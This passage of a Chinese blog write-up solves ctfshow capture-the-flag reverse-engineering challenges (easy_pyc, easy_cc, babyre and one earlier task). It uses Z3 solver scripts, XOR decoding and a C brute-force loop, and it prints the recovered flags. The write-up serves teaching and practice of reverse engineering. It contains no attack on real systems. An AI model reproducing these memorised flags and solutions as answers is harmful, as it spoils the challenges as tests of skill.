class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"320\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"321\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"322\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"323\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"324\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"325\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1967260144</span></pre></td></tr><tr><td data-num=\"326\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"327\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"328\"></td><td><pre>strflag <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"329\"></td><td><pre><span class=\"token keyword\">if</span> s<span class=\"token punctuation\">.</span>check<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> sat<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 检测是否有解</span></pre></td></tr><tr><td data-num=\"330\"></td><td><pre>    result <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>model<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"331\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> a1<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 因为最后得出的是等式，先遍历 a1，把 a1 的每个依次赋给 i</span></pre></td></tr><tr><td data-num=\"332\"></td><td><pre>        flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 然后找到每个 a1 对应的解，附加到空列表的后面</span></pre></td></tr><tr><td data-num=\"333\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"334\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"335\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'无解'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"336\"></td><td><pre><span class=\"token comment\">#得 [104, 97, 104, 97, 104, 97, 116, 104, 105, 115, 105, 115, 102, 97, 99, 107, 102, 108, 97, 103]</span></pre></td></tr></table></figure><p><strong>注意 Z3 约束求解器 - 初始化序列时选择正确的格式 比如这里就是 int 型序列</strong></p>\n<p>得第二次输入为 [104, 97, 104, 97, 104, 97, 116, 104, 105, 115, 105, 115, 102, 97, 99, 107, 102, 108, 97, 103]</p>\n<p><img data-src=\"/images/image-20230331183241670.png\" alt=\"image-20230331183241670\"></p>\n<p>z3 的数据在这里用到，又 weneed 比较数据已知 可求出数组 tempp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cp<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x00001207</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004CA0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004F21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000039</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0001A523</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000023A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000926</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004CA7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00006560</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000036</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0001A99B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00004CA8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0001BBE0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00003705</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000926</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x000077D3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00009A98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000657B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000018</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000B11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>z33<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span> <span class=\"token number\">115</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span> <span class=\"token number\">115</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span> <span class=\"token number\">97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span> <span class=\"token number\">108</span><span class=\"token punctuation\">,</span> <span class=\"token number\">97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">103</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>cp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    cp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">^</span><span class=\"token operator\">=</span>z33<span class=\"token punctuation\">[</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>cp<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>cp<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>cp (比较数据) 与倒过来的 z33 数据异或得 tempp 数组 [4704, 19649, 20301, 95, 107848, 601, 2375, 19649, 25875, 95, 109032, 19649, 113544, 14193, 2375, 30651, 39673, 25875, 121, 2937]</p>\n<p><img data-src=\"/images/image-20230331203202364.png\" alt=\"image-20230331203202364\"></p>\n<p><img data-src=\"/images/image-20230331203306709.png\" alt=\"image-20230331203306709\"></p>\n<p>最后的关键在这一步函数，又因为函数的第二个参数是 int 数组 somenum 已知，tempp 已知，直接爆破 flag</p>\n<p>C 语言爆破脚本如下</p>\n<pre><code class=\"language-C\">#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\nint baopo(int a1, int a2)&#123;\n    &#123;\n  unsigned int v3; \n  v3 = 1;\n  while ( a2 )\n  &#123;\n    if ( (a2 &amp; 1) != 0 )\n      v3 *= a1;\n    a1 = a1 * a1 % 1000;\n    a2 &gt;&gt;= 2;\n  &#125;\n  return v3;\n&#125;\n&#125;\nint main()&#123;\n    unsigned int somenum[20] = &#123;\n    0x00000007, 0x00000007, 0x00000007, 0x00000009, 0x00000005, 0x00000006, 0x00000007, 0x00000007, \n    0x00000007, 0x00000009, 0x00000007, 0x00000007, 0x00000005, 0x00000007, 0x00000007, 0x00000007, \n    0x00000005, 0x00000007, 0x00000009, 0x00000007\n&#125;;\nint cp[20]=&#123;4704, 19649, 20301, 95, 107848, 601, 2375, 19649, 25875, 95, 109032, 19649, 113544, 14193, 2375, 30651, 39673, 25875, 121, 2937&#125;;\n    int flag[20]=&#123;0&#125;;\n    for(int i=0; i&lt;20; i++)&#123;\n        \n        while (baopo(flag[i],somenum[i]) != cp[i])\n        &#123;\n         flag[i]++;\n        &#125;;\n        printf(&quot;%d &quot;,flag[i]);\n    \n&#125;\n&#125;\n\n</code></pre>\n<p>运行结果 84 49 101 95 122 51 95 49 115 95 118 49 114 57 95 51 97 115 121 33</p>\n<p>转字符即为 flag:    T1e_z3_1s_v1r9_3asy!    把 flag 用给定的格式包起来提交就行了</p>\n<p>​</p>\n<h2 id=\"ctfshow愚人杯re\"><a class=\"markdownIt-Anchor\" href=\"#ctfshow愚人杯re\">#</a> ctfshow 愚人杯 RE</h2>\n<p><img data-src=\"/images/image-20230402190420667.png\" alt=\"image-20230402190420667\"></p>\n<p>除了一道抽象谜语题 其他挺简单的 我都能一眼丁真</p>\n<h3 id=\"easy_pyc\"><a class=\"markdownIt-Anchor\" href=\"#easy_pyc\">#</a> easy_pyc</h3>\n<p>先解 pyc 发现很简单 不过就 114514 有点迷惑性 其实可以直接去掉 我直接 z3 解出</p>\n<p><img data-src=\"/images/image-20230401162939514.png\" alt=\"image-20230401162939514\"></p>\n<h4 id=\"脚本及flag\"><a class=\"markdownIt-Anchor\" href=\"#脚本及flag\">#</a> 脚本及 flag</h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> z3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>code <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>    <span class=\"token number\">0x16</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x1d</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x1e</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x1a</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x09</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xd0</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x2c</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x14</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x6d</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0xbd</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0xf7</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">0x2a</span><span class=\"token punctuation\">,</span>    <span class=\"token number\">0x0d</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xda</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xf9</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x1c</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x35</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x27</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xda</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xd4</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xd1</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x0b</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xc7</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xc7</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x1a</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">0xa1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>l <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>codec<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>a1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>BitVec<span class=\"token punctuation\">(</span><span class=\"token string\">'x%d'</span> <span class=\"token operator\">%</span> i<span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>s <span class=\"token operator\">=</span> Solver<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    num <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    codec<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>l <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    codec<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> codec<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> codec<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>codec<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>code<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">if</span> s<span class=\"token punctuation\">.</span>check<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> sat<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 检测是否有解</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    result <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>model<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> a1<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 因为最后得出的是等式，先遍历 a1，把 a1 的每个依次赋给 i</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 然后找到每个 a1 对应的解，附加到空列表的后面</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'无解'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token builtin\">str</span><span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span> <span class=\"token number\">115</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">111</span><span class=\"token punctuation\">,</span> <span class=\"token number\">119</span><span class=\"token punctuation\">,</span> <span class=\"token number\">123</span><span class=\"token punctuation\">,</span> <span class=\"token number\">74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">117</span><span class=\"token punctuation\">,</span> <span class=\"token number\">115</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">108</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39</span><span class=\"token punctuation\">,</span> <span class=\"token number\">115</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">121</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">51</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">51</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107</span><span class=\"token punctuation\">,</span> <span class=\"token number\">45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">125</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token builtin\">str</span><span class=\"token operator\">+=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p just_f00ls_d@y_r3_ch3ck-in!>ctfshow</p>\n<h4 id=\"easy_cc\"><a class=\"markdownIt-Anchor\" href=\"#easy_cc\">#</a> easy_cc</h4>\n<p>32 位 IDA 打开 程序逻辑很简单  直接解 上脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>eee<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x1f</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5c</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x1c</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x1e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x1a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x6d</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x0e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x3a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x1e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5d</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x57</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x34</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x16</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x5e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>key<span class=\"token operator\">=</span><span class=\"token string\">'key123'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>key<span class=\"token operator\">=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>v17<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>eee<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    v17<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>eee<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span>i<span class=\"token operator\">%</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>v17<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>strr<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>v17<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    strr<span class=\"token operator\">+=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>v17<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>strr<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p cc_re_good_good!>ctfshow</p>\n<h4 id=\"babyre\"><a class=\"markdownIt-Anchor\" href=\"#babyre\">#</a> babyre</h4>\n<p>动调</p>\n<p><img data-src=\"/images/image-20230402160324387.png\" alt=\"image-20230402160324387\"></p>\n<p>提取的比较数据 [0x79, 0x8F, 0xAA, 0xEE, 0x69, 0x6A, 0x65, 0x53, 0x2B, 0xEE, 0x7B, 0x80, 0x9B, 0xD7, 0x7D, 0x9B, 0xD0, 0x2B, 0xE8, 0x71, 0x7E, 0x9B, 0xBD, 0xFD]</p>\n<p><img data-src=\"/images/image-20230402161233601.png\" alt=\"image-20230402161233601\"></p>\n<p>看看加密函数</p>\n<p><img data-src=\"/images/image-20230402161428887.png\" alt=\"image-20230402161428887\"></p>\n<p>我直接开爆 (其实是 z3)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> z3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>BitVec<span class=\"token punctuation\">(</span><span class=\"token string\">'x%d'</span> <span class=\"token operator\">%</span> i<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># 初始化序列</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>s <span class=\"token operator\">=</span> Solver<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 创建约束求解器</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>cp<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B</span><span class=\"token punctuation\">,</span> <span class=\"token 